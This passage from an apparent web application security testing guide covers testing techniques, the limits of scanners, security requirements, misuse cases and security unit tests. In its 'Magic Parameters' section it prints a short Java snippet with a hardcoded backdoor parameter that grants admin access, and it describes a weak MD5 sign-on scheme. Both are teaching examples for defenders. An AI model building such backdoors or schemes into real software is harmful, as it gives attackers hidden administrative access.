carefully review the findings and weed out any false positives that may remain in the report. Reporting an incorrect security finding can often undermine the valid message of the rest of a security report. Care should be taken to verify that every possible section of application logic has been tested, and that every use case scenario was explored for possible vulnerabilities.\n\n### Use Source Code When Available\n\nWhile black-box penetration test results can be impressive and useful to demonstrate how vulnerabilities are exposed in a production environment, they are not the most effective or efficient way to secure an application. It is difficult for dynamic testing to test the entire codebase, particularly if many nested conditional statements exist. If the source code for the application is available, it should be given to the security staff to assist them while performing their review. It is possible to discover vulnerabilities within the application source that would be missed during a black-box engagement.\n\n### Disable Compensating Controls for Testers\n\nTesting traffic should be allowed through compensating controls such as a Web Application Firewall (WAF). While a WAF can block many attacks on an application, a sophisticated attacker can bypass the control and exploit the vulnerable underlying application with enough time and dedication. Like providing source code access, turning off the compensating control enables the security staff to dedicate all their focus to the application logic. A white-box penetration test aims to find security vulnerabilities in the product itself, not the systems that proxy traffic to the production environment.\n\n### Develop Metrics\n\nAn important part of a good security program is the ability to determine if things are getting better. It is important to track the results of testing engagements, and develop metrics that will reveal the application security trends within the organization.\n\nGood metrics will show:\n\n- If more education and training are required;\n- If there is a particular security mechanism that is not clearly understood by the development team;\n- If the total number of security related problems being found is decreasing.\n\nConsistent metrics that can be generated in an automated way from available source code will also help the organization in assessing the effectiveness of mechanisms introduced to reduce security bugs in software development. Metrics are not easily developed, so using a standard such as the one provided by the [IEEE](https://ieeexplore.ieee.org/document/237006) is a good starting point.\n\n### Document the Test Results\n\nTo conclude the testing process, it is important to produce a formal record of what testing actions were taken, by whom, when they were performed, and details of the test findings. It is wise to agree on an acceptable format for the report that is useful to all concerned parties, which may include developers, project management, business owners, IT department, audit, and compliance.\n\nThe report should clearly identify to the business owner where material risks exist, and do so in a manner sufficient to get their backing for subsequent mitigation actions. The report should also be clear to the developer in pin-pointing the exact function that is affected by the vulnerability and associated recommendations for resolving issues in a language that the developer will understand. The report should also allow another security tester to reproduce the results. Writing the report should not be overly burdensome on the security tester themselves. Security testers are not generally renowned for their creative writing skills, and agreeing on a complex report can lead to instances where test results are not properly documented. Using a security test report template can save time and ensure that results are documented accurately and consistently, and are in a format that is suitable for the audience.\n\n## Testing Techniques Explained\n\nThis section presents a high-level overview of various testing techniques that can be employed when building a testing program. It does not present specific methodologies for these techniques, as this information is covered in Chapter 3. This section is included to provide context for the framework presented in the next chapter and to highlight the advantages or disadvantages of some of the techniques that should be considered. In particular, we will cover:\n\n- Manual Inspections & Reviews\n- Threat Modeling\n- Code Review\n- Penetration Testing\n\n## Manual Inspections and Reviews\n\n### Overview\n\nManual inspections are human reviews that typically test the security implications of people, policies, and processes. Manual inspections can also include inspection of technology decisions such as architectural designs. They are usually conducted by analyzing documentation or performing interviews with the designers or system owners.\n\nWhile the concept of manual inspections and human reviews is simple, they can be among the most powerful and effective techniques available. By asking someone how something works and why it was implemented in a specific way, the tester can quickly determine if any security concerns are likely to be evident. Manual inspections and reviews are one of the few ways to test the software development lifecycle process itself and to ensure that there is an adequate policy or skill set in place.\n\nAs with many things in life, when conducting manual inspections and reviews it is recommended that a trust-but-verify model is adopted. Not everything that the tester is shown or told will be accurate. Manual reviews are particularly good for testing whether people understand the security process, have been made aware of policy, and have the appropriate skills to design or implement secure applications.\n\nOther activities, including manually reviewing the documentation, secure coding policies, security requirements, and architectural designs, should all be accomplished using manual inspections.\n\n### Advantages\n\n- Requires no supporting technology\n- Can be applied to a variety of situations\n- Flexible\n- Promotes teamwork\n- Early in the SDLC\n\n### Disadvantages\n\n- Can be time-consuming\n- Supporting material not always available\n- Requires significant human thought and skill to be effective\n\n## Threat Modeling\n\n### Overview\n\nThreat modeling has become a popular technique to help system designers think about the security threats that their systems and applications might face. Therefore, threat modeling can be seen as risk assessment for applications. It enables the designer to develop mitigation strategies for potential vulnerabilities and helps them focus their inevitably limited resources and attention on the parts of the system that most require it. It is recommended that all applications have a threat model developed and documented. Threat models should be created as early as possible in the SDLC, and should be revisited as the application evolves and development progresses.\n\nTo develop a threat model, we recommend taking a simple approach that follows the [NIST 800-30](https://csrc.nist.gov/publications/detail/sp/800-30/rev-1/final) standard for risk assessment. This approach involves:\n\n- Decomposing the application – use a process of manual inspection to understand how the application works, its assets, functionality, and connectivity.\n- Defining and classifying the assets – classify the assets into tangible and intangible assets and rank them according to business importance.\n- Exploring potential vulnerabilities - whether technical, operational, or managerial.\n- Exploring potential threats – develop a realistic view of potential attack vectors from an attacker’s perspective by using threat scenarios or attack trees.\n- Creating mitigation strategies – develop mitigating controls for each of the threats deemed to be realistic.\n\nThe output from a threat model itself can vary but is typically a collection of lists and diagrams.\nVarious Open Source projects and commercial products support application threat modeling methodologies\nthat can be used as a reference for testing applications for potential security flaws in the design of the application.\nIt may be worth considering using one of the OWASP threat modeling tool projects,\nPythonic Threat Modeling ([pytm](https://owasp.org/www-project-pytm/))\nand [Threat Dragon](https://owasp.org/www-project-threat-dragon/),\nwhich provide differing but equally valid ways of creating threat models.\n\nThere is no right or wrong way to develop threat models and perform information risk assessments on applications;\nbe flexible and select the tools and processes that will fit with how a particular organization or development team works.\n\n### Advantages\n\n- Practical attacker view of the system\n- Flexible\n- Early in the SDLC\n\n### Disadvantages\n\n- Good threat models don’t automatically mean good software\n\n## Source Code Review\n\n### Overview\n\nSource code review is the process of manually checking the source code of a web application for security issues. Many serious security vulnerabilities cannot be detected with any other form of analysis or testing. As the popular saying goes \"if you want to know what’s really going on, go straight to the source.\" Almost all security experts agree that there is no substitute for actually looking at the code. All the information for identifying security problems is there in the code, somewhere. Unlike testing closed software such as operating systems, when testing web applications (especially if they have been developed in-house) the source code should be made available for testing purposes.\n\nMany unintentional but significant security problems are extremely difficult to discover with other forms of analysis or testing, such as penetration testing. This makes source code analysis the technique of choice for technical testing. With the source code, a tester can accurately determine what is happening (or is supposed to be happening) and remove the guess work of black-box testing.\n\nExamples of issues that are particularly conducive to being found through source code reviews include concurrency problems, flawed business logic, access control problems, and cryptographic weaknesses, as well as backdoors, Trojans, Easter eggs, time bombs, logic bombs, and other forms of malicious code. These issues often manifest themselves as the most harmful vulnerabilities in web applications. Source code analysis can also be extremely efficient to find implementation issues such as places where input validation was not performed or where fail-open control procedures may be present. Operational procedures need to be reviewed as well, since the source code being deployed might not be the same as the one being analyzed herein. [Ken Thompson's Turing Award speech](https://ia600903.us.archive.org/11/items/pdfy-Qf4sZZSmHKQlHFfw/p761-thompson.pdf) describes one possible manifestation of this issue.\n\n### Advantages\n\n- Completeness and effectiveness\n- Accuracy\n- Fast (for competent reviewers)\n\n### Disadvantages\n\n- Requires highly skilled security aware developers\n- Can miss issues in compiled libraries\n- Cannot detect runtime errors easily\n- The source code actually deployed might differ from the one being analyzed\n\nFor more on code review, see the [OWASP code review project](https://owasp.org/www-project-code-review-guide).\n\n## Penetration Testing\n\n### Overview\n\nPenetration testing has been a common technique used to test network security for decades. It is also commonly known as black-box testing or ethical hacking. Penetration testing is essentially the \"art\" of testing a system or application remotely to find security vulnerabilities, without knowing the inner workings of the target itself. Typically, the penetration test team is able to access an application as if they were users. The tester acts like an attacker and attempts to find and exploit vulnerabilities. In many cases the tester will be given one or more valid accounts on the system.\n\nWhile penetration testing has proven to be effective in network security, the technique does not naturally translate to applications. When penetration testing is performed on networks and operating systems, the majority of the work involved is in finding, and then exploiting, known vulnerabilities in specific technologies. As web applications are almost exclusively bespoke, penetration testing in the web application arena is more akin to pure research. Some automated penetration testing tools have been developed, but considering the bespoke nature of web applications, their effectiveness alone can be poor.\n\nMany people use web application penetration testing as their primary security testing technique. Whilst it certainly has its place in a testing program, we do not believe it should be considered as the primary or only testing technique. As Gary McGraw wrote in [Software Penetration Testing](https://www.garymcgraw.com/wp-content/uploads/2015/11/bsi6-pentest.pdf), \"In practice, a penetration test can only identify a small representative sample of all possible security risks in a system.\" However, focused penetration testing (i.e., testing that attempts to exploit known vulnerabilities detected in previous reviews) can be useful in detecting if some specific vulnerabilities are actually fixed in the deployed source code.\n\n### Advantages\n\n- Can be fast (and therefore cheap)\n- Requires a relatively lower skill-set than source code review\n- Tests the code that is actually being exposed\n\n### Disadvantages\n\n- Too late in the SDLC\n- Front-impact testing only\n\n## The Need for a Balanced Approach\n\nWith so many techniques and approaches to testing the security of web applications, it can be difficult to understand which techniques to use or when to use them. Experience shows that there is no right or wrong answer to the question of exactly which techniques should be used to build a testing framework. In fact, all techniques should be used to test all the areas that need to be tested.\n\nAlthough it is clear that there is no single technique that can be performed to effectively cover all security testing and ensure that all issues have been addressed, many companies adopt only one approach. The single approach used has historically been penetration testing. Penetration testing, while useful, cannot effectively address many of the issues that need to be tested. It is simply \"too little too late\" in the SDLC.\n\nThe correct approach is a balanced approach that includes several techniques, from manual reviews to technical testing, to CI/CD integrated testing. A balanced approach should cover testing in all phases of the SDLC. This approach leverages the most appropriate techniques available, depending on the current SDLC phase.\n\nOf course there are times and circumstances where only one technique is possible. For example, consider a test of a web application that has already been created, but where the testing party does not have access to the source code. In this case, penetration testing is clearly better than no testing at all. However, the testing parties should be encouraged to challenge assumptions, such as not having access to source code, and to explore the possibility of more complete testing.\n\nA balanced approach varies depending on many factors, such as the maturity of the testing process and corporate culture. It is recommended that a balanced testing framework should look something like the representations shown in Figure 3 and Figure 4. The following figure shows a typical proportional representation overlaid onto the SLDC. In keeping with research and experience, it is essential that companies place a higher emphasis on the early stages of development.\n\n![Proportion of Test Effort in SDLC](images/ProportionSDLC.png)\\\n*Figure 2-3: Proportion of Test Effort in SDLC*\n\nThe following figure shows a typical proportional representation overlaid onto testing techniques.\n\n![Proportion of Test Effort According to Test Technique](images/ProportionTest.png)\\\n*Figure 2-4: Proportion of Test Effort According to Test Technique*\n\n### A Note about Web Application Scanners\n\nMany organizations have started to use automated web application scanners. While they undoubtedly have a place in a testing program, some fundamental issues need to be highlighted about why it is believed that automating black-box testing is not (nor will ever be) completely effective. However, highlighting these issues should not discourage the use of web application scanners. Rather, the aim is to ensure the limitations are understood and testing frameworks are planned appropriately.\n\nIt is helpful to understand the efficacy and limitations of automated vulnerability detection tools. To this end, the [OWASP Benchmark Project](https://owasp.org/www-project-benchmark/) is a test suite designed to evaluate the speed, coverage, and accuracy of automated software vulnerability detection tools and services. Benchmarking can help to test the capabilities of these automated tools, and help to make their usefulness explicit.\n\nThe following examples show why automated black-box testing may not be effective.\n\n### Example 1: Magic Parameters\n\nImagine a simple web application that accepts a name-value pair of \"magic\" and then the value. For simplicity, the GET request may be: `https://www.host/application?magic=value`\n\nTo further simplify the example, the values in this case can only be ASCII characters a – z (upper or lowercase) and integers 0 – 9.\n\nThe designers of this application created an administrative backdoor during testing, but obfuscated it to prevent the casual observer from discovering it. By submitting the value sf8g7sfjdsurtsdieerwqredsgnfg8d (30 characters), the user will then be logged in and presented with an administrative screen with total control of the application. The HTTP request is now: `https://www.host/application?magic=sf8g7sfjdsurtsdieerwqredsgnfg8d`\n\nGiven that all of the other parameters were simple two- and three-characters fields, it is not possible to start guessing combinations at approximately 28 characters. A web application scanner will need to brute force (or guess) the entire key space of 30 characters. That is up to 30\\^28 permutations, or trillions of HTTP requests. That is an electron in a digital haystack.\n\nThe code for this exemplar Magic Parameter check may look like the following:\n\n```java\npublic void doPost( HttpServletRequest request, HttpServletResponse response) {\n  String magic = \"sf8g7sfjdsurtsdieerwqredsgnfg8d\";\n  boolean admin = magic.equals( request.getParameter(\"magic\"));\n  if (admin) doAdmin( request, response);\n  else … // normal processing\n}\n```\n\nBy looking in the code, the vulnerability practically leaps off the page as a potential problem.\n\n### Example 2: Bad Cryptography\n\nCryptography is widely used in web applications. Imagine that a developer decided to write a simple cryptography algorithm to sign a user in from site A to site B automatically. In their wisdom, the developer decides that if a user is logged into site A, then they will generate a key using an MD5 hash function that comprises: `Hash { username : date }`.\n\nWhen a user is passed to site B, they will send the key on the query string to site B in an HTTP redirect. Site B independently computes the hash, and compares it to the hash passed on the request. If they match, site B signs the user in as the user they claim to be.\n\nAs the scheme is explained the inadequacies can be worked out. Anyone that figures out the scheme (or is told how it works, or downloads the information from Bugtraq) can log in as any user. Manual inspection, such as a review or code inspection, would have uncovered this security issue quickly. A black-box web application scanner would not have uncovered the vulnerability. It would have seen a 128-bit hash that changed with each user, and by the nature of hash functions, did not change in any predictable way.\n\n### A Note about Static Source Code Review Tools\n\nMany organizations have started to use static source code scanners. While they undoubtedly have a place in a comprehensive testing program, it is necessary to highlight some fundamental issues about why this approach is not effective when used alone. Static source code analysis alone cannot identify issues due to flaws in the design, since it cannot understand the context in which the code is constructed. Source code analysis tools are useful in determining security issues due to coding errors, however significant manual effort is required to validate the findings.\n\n## Deriving Security Test Requirements\n\nTo have a successful testing program, one must know what the testing objectives are. These objectives are specified by the security requirements. This section discusses in detail how to document requirements for security testing by deriving them from applicable standards and regulations, from positive application requirements (specifying what the application is supposed to do), and from negative application requirements (specifying what the application should not do). It also discusses how security requirements effectively drive security testing during the SDLC and how security test data can be used to effectively manage software security risks.\n\n### Testing Objectives\n\nOne of the objectives of security testing is to validate that security controls operate as expected. This is documented via `security requirements` that describe the functionality of the security control. At a high level, this means proving confidentiality, integrity, and availability of the data as well as the service. The other objective is to validate that security controls are implemented with few or no vulnerabilities. These are common vulnerabilities, such as the [OWASP Top Ten](https://owasp.org/www-project-top-ten/), as well as vulnerabilities that have been previously identified with security assessments during the SDLC, such as threat modeling, source code analysis, and penetration test.\n\n### Security Requirements Documentation\n\nThe first step in the documentation of security requirements is to understand the `business requirements`. A business requirement document can provide initial high-level information on the expected functionality of the application. For example, the main purpose of an application may be to provide financial services to customers or to allow goods to be purchased from an on-line catalog. A security section of the business requirements should highlight the need to protect the customer data as well as to comply with applicable security documentation such as regulations, standards, and policies.\n\nA general checklist of the applicable regulations, standards, and policies is a good preliminary security compliance analysis for web applications. For example, compliance regulations can be identified by checking information about the business sector and the country or state where the application will operate. Some of these compliance guidelines and regulations might translate into specific technical requirements for security controls. For example, in the case of financial applications, compliance with the Federal Financial Institutions Examination Council (FFIEC) [Cybersecurity Assessment Tool & Documentation](https://www.ffiec.gov/cyberassessmenttool.htm) requires that financial institutions implement applications that mitigate weak authentication risks with multi-layered security controls and multi-factor authentication.\n\nApplicable industry standards for security must also be captured by the general security requirement checklist. For example, in the case of applications that handle customer credit card data, compliance with the [PCI Security Standards Council](https://www.pcisecuritystandards.org/pci_security/) Data Security Standard (DSS) forbids the storage of PINs and CVV2 data and requires that the merchant protect magnetic strip data in storage and transmission with encryption and on display by masking. Such PCI DSS security requirements could be validated via source code analysis.\n\nAnother section of the checklist needs to enforce general requirements for compliance with the organization's information security standards and policies. From the functional requirements perspective, requirements for the security control need to map to a specific section of the information security standards. An example of such a requirement can be: \"a password complexity of ten alphanumeric characters must be enforced by the authentication controls used by the application.\" When security requirements map to compliance rules, a security test can validate the exposure of compliance risks. If violation with information security standards and policies are found, these will result in a risk that can be documented and that the business has to manage or address. Since these security compliance requirements are enforceable, they need to be well documented and validated with security tests.\n\n### Security Requirements Validation\n\nFrom the functionality perspective, the validation of security requirements is the main objective of security testing. From the risk management perspective, the validation of security requirements is the objective of information security assessments. At a high level, the main goal of information security assessments is the identification of gaps in security controls, such as lack of basic authentication, authorization, or encryption controls. Examined further, the security assessment objective is risk analysis, such as the identification of potential weaknesses in security controls that ensure the confidentiality, integrity, and availability of the data. For example, when the application deals with personally identifiable information (PII) and sensitive data, the security requirement to be validated is the compliance with the company information security policy requiring encryption of such data in transit and in storage. Assuming encryption is used to protect the data, encryption algorithms and key lengths need to comply with the organization's encryption standards. These might require that only certain algorithms and key lengths be used. For example, a security requirement that can be security tested is verifying that only allowed ciphers are used (e.g., SHA-256, RSA, AES) with allowed minimum key lengths (e.g., more than 128 bit for symmetric and more than 1024 for asymmetric encryption).\n\nFrom the security assessment perspective, security requirements can be validated at different phases of the SDLC by using different artifacts and testing methodologies. For example, threat modeling focuses on identifying security flaws during design; secure code analysis and reviews focus on identifying security issues in source code during development; and penetration testing focuses on identifying vulnerabilities in the application during testing or validation.\n\nSecurity issues that are identified early in the SDLC can be documented in a test plan so they can be validated later with security tests. By combining the results of different testing techniques, it is possible to derive better security test cases and increase the level of assurance of the security requirements. For example, distinguishing true vulnerabilities from the un-exploitable ones is possible when the results of penetration tests and source code analysis are combined. Considering the security test for a SQL injection vulnerability, for example, a black-box test might first involve a scan of the application to fingerprint the vulnerability. The first evidence of a potential SQL injection vulnerability that can be validated is the generation of a SQL exception. A further validation of the SQL vulnerability might involve manually injecting attack vectors to modify the grammar of the SQL query for an information disclosure exploit. This might involve a lot of trial-and-error analysis before the malicious query is executed. Assuming the tester has the source code, they might directly learn from the source code analysis how to construct the SQL attack vector that will successfully exploit the vulnerability (e.g., execute a malicious query returning confidential data to unauthorized user). This can expedite the validation of the SQL vulnerability.\n\n### Threats and Countermeasures Taxonomies\n\nA `threat and countermeasure classification`, which takes into consideration root causes of vulnerabilities, is the critical factor in verifying that security controls are designed, coded, and built to mitigate the impact of the exposure of such vulnerabilities. In the case of web applications, the exposure of security controls to common vulnerabilities, such as the OWASP Top Ten, can be a good starting point to derive general security requirements. The [OWASP Testing Guide Checklists](https://github.com/OWASP/wstg/tree/master/checklists) are a helpful resource for guiding testers through specific vulnerabilities and validation tests.\n\nThe focus of a threat and countermeasure categorization is to define security requirements in terms of the threats and the root cause of the vulnerability. A threat can be categorized by using [STRIDE](https://en.wikipedia.org/wiki/STRIDE_(security)), an acronym for Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, and Elevation of privilege. The root cause can be categorized as security flaw in design, a security bug in coding, or an issue due to insecure configuration. For example, the root cause of weak authentication vulnerability might be the lack of mutual authentication when data crosses a trust boundary between the client and server tiers of the application. A security requirement that captures the threat of non-repudiation during an architecture design review allows for the documentation of the requirement for the countermeasure (e.g., mutual authentication) that can be validated later on with security tests.\n\nA threat and countermeasure categorization for vulnerabilities can also be used to document security requirements for secure coding such as secure coding standards. An example of a common coding error in authentication controls consists of applying a hash function to encrypt a password, without applying a seed to the value. From the secure coding perspective, this is a vulnerability that affects the encryption used for authentication with a vulnerability root cause in a coding error. Since the root cause is insecure coding, the security requirement can be documented in secure coding standards and validated through secure code reviews during the development phase of the SDLC.\n\n### Security Testing and Risk Analysis\n\nSecurity requirements need to take into consideration the severity of the vulnerabilities to support a `risk mitigation strategy`. Assuming that the organization maintains a repository of vulnerabilities found in applications (i.e, a vulnerability knowledge base), the security issues can be reported by type, issue, mitigation, root cause, and mapped to the applications where they are found. Such a vulnerability knowledge base can also be used to establish a metrics to analyze the effectiveness of the security tests throughout the SDLC.\n\nFor example, consider an input validation issue, such as a SQL injection, which was identified via source code analysis and reported with a coding error root cause and input validation vulnerability type. The exposure of such vulnerability can be assessed via a penetration test, by probing input fields with several SQL injection attack vectors. This test might validate that special characters are filtered before hitting the database and mitigate the vulnerability. By combining the results of source code analysis and penetration testing, it is possible to determine the likelihood and exposure of the vulnerability and calculate the risk rating of the vulnerability. By reporting vulnerability risk ratings in the findings (e.g., test report) it is possible to decide on the mitigation strategy. For example, high and medium risk vulnerabilities can be prioritized for remediation, while low risk vulnerabilities can be fixed in future releases.\n\nBy considering the threat scenarios of exploiting common vulnerabilities, it is possible to identify potential risks that the application security control needs to be security tested for. For example, the OWASP Top Ten vulnerabilities can be mapped to attacks such as phishing, privacy violations, identify theft, system compromise, data alteration or data destruction, financial loss, and reputation loss. Such issues should be documented as part of the threat scenarios. By thinking in terms of threats and vulnerabilities, it is possible to devise a battery of tests that simulate such attack scenarios. Ideally, the organization's vulnerability knowledge base can be used to derive security-risk-driven test cases to validate the most likely attack scenarios. For example, if identity theft is considered high risk, negative test scenarios should validate the mitigation of impacts deriving from the exploit of vulnerabilities in authentication, cryptographic controls, input validation, and authorization controls.\n\n### Deriving Functional and Non-Functional Test Requirements\n\n#### Functional Security Requirements\n\nFrom the perspective of functional security requirements, the applicable standards, policies, and regulations drive both the need for a type of security control as well as the control functionality. These requirements are also referred to as \"positive requirements\", since they state the expected functionality that can be validated through security tests. Examples of positive requirements are: \"the application will lockout the user after six failed log on attempts\" or \"passwords need to be a minimum of ten alphanumeric characters\". The validation of positive requirements consists of asserting the expected functionality and can be tested by re-creating the testing conditions and running the test according to predefined inputs. The results are then shown as a fail or pass condition.\n\nIn order to validate security requirements with security tests, security requirements need to be function-driven. They need to highlight the expected functionality (the what) and imply the implementation (the how). Examples of high-level security design requirements for authentication can be:\n\n- Protect user credentials or shared secrets in transit and in storage.\n- Mask any confidential data in display (e.g., passwords, accounts).\n- Lock the user account after a certain number of failed log in attempts.\n- Do not show specific validation errors to the user as a result of a failed log on.\n- Only allow passwords that are alphanumeric, include special characters, and are a minimum ten characters in length, to limit the attack surface.\n- Allow for password change functionality only to authenticated users by validating the old password, the new password, and the user's answer to the challenge question, to prevent brute forcing of a password via password change.\n- The password reset form should validate the user’s username and the user’s registered email before sending the temporary password to the user via email. The temporary password issued should be a one-time password. A link to the password reset web page will be sent to the user. The password reset web page should validate the user's temporary password, the new password, as well as the user's answer to the challenge question.\n\n#### Risk-Driven Security Requirements\n\nSecurity tests must also be risk-driven. They need to validate the application for unexpected behavior, or negative requirements.\n\nExamples of negative requirements are:\n\n- The application should not allow for the data to be altered or destroyed.\n- The application should not be compromised or misused for unauthorized financial transactions by a malicious user.\n\nNegative requirements are more difficult to test, because there is no expected behavior to look for. Looking for expected behavior to suit the above requirements might require a threat analyst to unrealistically come up with unforeseeable input conditions, causes, and effects. Hence, security testing needs to be driven by risk analysis and threat modeling. The key is to document the threat scenarios, and the functionality of the countermeasure as a factor to mitigate a threat.\n\nFor example, in the case of authentication controls, the following security requirements can be documented from the threats and countermeasures perspective:\n\n- Encrypt authentication data in storage and transit to mitigate risk of information disclosure and authentication protocol attacks.\n- Encrypt passwords using non-reversible encryption such as using a digest (e.g., HASH) and a seed to prevent dictionary attacks.\n- Lock out accounts after reaching a log on failure threshold and enforce password complexity to mitigate risk of brute force password attacks.\n- Display generic error messages upon validation of credentials to mitigate risk of account harvesting or enumeration.\n- Mutually authenticate client and server to prevent non-repudiation and Manipulator In the Middle (MiTM) attacks.\n\nThreat modeling tools such as threat trees and attack libraries can be useful to derive the negative test scenarios. A threat tree will assume a root attack (e.g., attacker might be able to read other users' messages) and identify different exploits of security controls (e.g., data validation fails because of a SQL injection vulnerability) and necessary countermeasures (e.g., implement data validation and parametrized queries) that could be validated to be effective in mitigating such attacks.\n\n### Deriving Security Test Requirements Through Use and Misuse Cases\n\nA prerequisite to describing the application functionality is to understand what the application is supposed to do and how. This can be done by describing use cases. Use cases, in the graphical form as is commonly used in software engineering, show the interactions of actors and their relations. They help to identify the actors in the application, their relationships, the intended sequence of actions for each scenario, alternative actions, special requirements, preconditions, and post-conditions.\n\nSimilar to use cases, misuse or abuse cases describe unintended and malicious use scenarios of the application. These misuse cases provide a way to describe scenarios of how an attacker could misuse and abuse the application. By going through the individual steps in a use scenario and thinking about how it can be maliciously exploited, potential flaws or aspects of the application that are not well defined can be discovered. The key is to describe all possible or, at least, the most critical use and misuse scenarios.\n\nMisuse scenarios allow the analysis of the application from the attacker's point of view and contribute to identifying potential vulnerabilities and the countermeasures that need to be implemented to mitigate the impact caused by the potential exposure to such vulnerabilities. Given all of the use and abuse cases, it is important to analyze them to determine which are the most critical and need to be documented in security requirements. The identification of the most critical misuse and abuse cases drives the documentation of security requirements and the necessary controls where security risks should be mitigated.\n\nTo derive security requirements from [both use and misuse cases](https://iacis.org/iis/2006/Damodaran.pdf), it is important to define the functional scenarios and the negative scenarios and put these in graphical form. The following example is a step-by-step methodology for the case of deriving security requirements for authentication.\n\n#### Step 1: Describe the Functional Scenario\n\nUser authenticates by supplying a username and password. The application grants access to users based upon authentication of user credentials by the application and provides specific errors to the user when validation fails.\n\n#### Step 2: Describe the Negative Scenario\n\nAttacker breaks the authentication through a brute force or dictionary attack of passwords and account harvesting vulnerabilities in the application. The validation errors provide specific information to an attacker that is used to guess which accounts are valid registered accounts (usernames). The attacker then attempts to brute force the password for a valid account. A brute force attack on passwords with a minimum length of four digits can succeed with a limited number of attempts (i.e., 10\\^4).\n\n#### Step 3: Describe Functional and Negative Scenarios with Use and Misuse Case\n\nThe graphical example below depicts the derivation of security requirements via use and misuse cases. The functional scenario consists of the user actions (entering a username and password) and the application actions (authenticating the user and providing an error message if validation fails). The misuse case consists of the attacker actions, i.e. trying to break authentication by brute forcing the password via a dictionary attack and by guessing the valid usernames from error messages. By graphically representing the threats to the user actions (misuses), it is possible to derive the countermeasures as the application actions that mitigate such threats.\n\n![Use and Misuse case](images/640px-UseAndMisuseCase.png)\\\n*Figure 2-5: Use and Misuse Case*\n\n#### Step 4: Elicit the Security Requirements\n\nIn this case, the following security requirements for authentication are derived:\n\n  1. Passwords requirements must be aligned with the current standards for sufficient complexity.\n  2. Accounts must be to locked out after five unsuccessful log in attempts.\n  3. Log in error messages must be generic.\n\nThese security requirements need to be documented and tested.\n\n## Security Tests Integrated in Development and Testing Workflows\n\n### Security Testing in the Development Workflow\n\nSecurity testing during the development phase of the SDLC represents the first opportunity for developers to ensure that the individual software components they have developed are security tested before they are integrated with other components or built into the application. Software components might consist of software artifacts such as functions, methods, and classes, as well as application programming interfaces, libraries, and executable files. For security testing, developers can rely on the results of the source code analysis to verify statically that the developed source code does not include potential vulnerabilities and is compliant with the secure coding standards. Security unit tests can further verify dynamically (i.e., at runtime) that the components function as expected. Before integrating both new and existing code changes in the application build, the results of the static and dynamic analysis should be reviewed and validated.\n\nThe validation of source code before integration in application builds is usually the responsibility of the senior developer. Senior developers are often the subject matter experts in software security and their role is to lead the secure code review. They must make decisions on whether to accept the code to be released in the application build, or to require further changes and testing. This secure code review workflow can be enforced via formal acceptance, as well as a check in a workflow management tool. For example, assuming the typical defect management workflow used for functional bugs, security bugs that have been fixed by a developer can be reported on a defect or change management system. The build master then can look at the test results reported by the developers in the tool, and grant approvals for checking in the code changes into the application build.\n\n### Security Testing in the Test Workflow\n\nAfter components and code changes are tested by developers and checked in to the application build, the most likely next step in the software development process workflow is to perform tests on the application as a whole entity. This level of testing is usually referred to as integrated test and system level test. When security tests are part of these testing activities, they can be used to validate both the security functionality of the application as a whole, as well as the exposure to application level vulnerabilities. These security tests on the application include both white-box testing, such as source code analysis, and black-box testing, such as penetration testing. Tests can also include gray-box testing, in which it is assumed that the tester has some partial knowledge about the application. For example, with some knowledge about the session management of the application, the tester can better understand whether the log out and timeout functions are properly secured.\n\nThe target for the security tests is the complete system that is vulnerable to attack. During this phase, it is possible for security testers to determine whether vulnerabilities can be exploited. These include common web application vulnerabilities, as well as security issues that have been identified earlier in the SDLC with other activities such as threat modeling, source code analysis, and secure code reviews.\n\nUsually, testing engineers, rather than software developers, perform security tests when the application is in scope for integration system tests. Testing engineers have security knowledge of web application vulnerabilities, black-box and white-box testing techniques, and own the validation of security requirements in this phase. In order to perform security tests, it is a prerequisite that security test cases are documented in the security testing guidelines and procedures.\n\nA testing engineer who validates the security of the application in the integrated system environment might release the application for testing in the operational environment (e.g., user acceptance tests). At this stage of the SDLC (i.e., validation), the application's functional testing is usually a responsibility of QA testers, while white-hat hackers or security consultants are usually responsible for security testing. Some organizations rely on their own specialized ethical hacking team to conduct such tests when a third party assessment is not required (such as for auditing purposes).\n\nSince these tests can sometimes be the last line of defense for fixing vulnerabilities before the application is released to production, it is important that issues are addressed as recommended by the testing team. The recommendations can include code, design, or configuration change. At this level, security auditors and information security officers discuss the reported security issues and analyze the potential risks according to information risk management procedures. Such procedures might require the development team to fix all high risk vulnerabilities before the application can be deployed, unless such risks are acknowledged and accepted.\n\n### Developer's Security Tests\n\n#### Security Testing in the Coding Phase: Unit Tests\n\nFrom the developer’s perspective, the main objective of security tests is to validate that code is being developed in compliance with secure coding standards requirements. Developers' own coding artifacts (such as functions, methods, classes, APIs, and libraries) need to be functionally validated before being integrated into the application build.\n\nThe security requirements that developers have to follow should be documented in secure coding standards and validated with static and dynamic analysis. If the unit test activity follows a secure code review, unit tests can validate that code changes required by secure code reviews are properly implemented. Both secure code reviews and source code analysis through source code analysis tools can help developers in identifying security issues in source code as it is developed. By using unit tests and dynamic analysis (e.g., debugging) developers can validate the security functionality of components as well as verify that the countermeasures being developed mitigate any security risks previously identified through threat modeling and source code analysis.\n\nA good practice for developers is to build security test cases as a generic security test suite that is part of the existing unit testing framework. A generic security test suite could be derived from previously defined use and misuse cases to security test functions, methods and classes. A generic security test suite might include security test cases to validate both positive and negative requirements for security controls such as:\n\n- Identity, authentication & access control\n- Input validation & encoding\n- Encryption\n- User and session management\n- Error and exception handling\n- Auditing and logging\n\nDevelopers empowered with a source code analysis tool integrated into their IDE, secure coding standards, and a security unit testing framework can assess and verify the security of the software components being developed. Security test cases can be run to identify potential security issues that have root causes in source code: besides input and output validation of parameters entering and exiting the components, these issues include authentication and authorization checks done by the component, protection of the data within the component, secure exception and error handling, and secure auditing and logging. Unit test frameworks such as JUnit, NUnit, and CUnit can be adapted to verify security test requirements. In the case of security functional tests, unit level tests can test the functionality of security controls at the software component level, such as functions, methods, or classes. For example, a test case could validate input and output validation (e.g., variable sanitation) and boundary checks for variables by asserting the expected functionality of the component.\n\nThe threat scenarios identified with use and misuse cases can be used to document the procedures for testing software components. In the case of authentication components, for example, security unit tests can assert the functionality of setting an account lockout as well as the fact that user input parameters cannot be abused to bypass the account lockout (e.g., by setting the account lockout counter to a negative number).\n\nAt the component level, security unit tests can validate positive assertions as well as negative assertions, such as errors and exception handling. Exceptions should be caught without leaving the system in an insecure state, such as potential denial of service caused by resources not being de-allocated (e.g., connection handles not closed within a final statement block), as well as potential elevation of privileges (e.g., higher privileges acquired before the exception is thrown and not re-set to the previous level before exiting the function). Secure error handling can validate potential information disclosure via informative error messages and stack traces.\n\nUnit level security test cases can be developed by a security engineer who is the 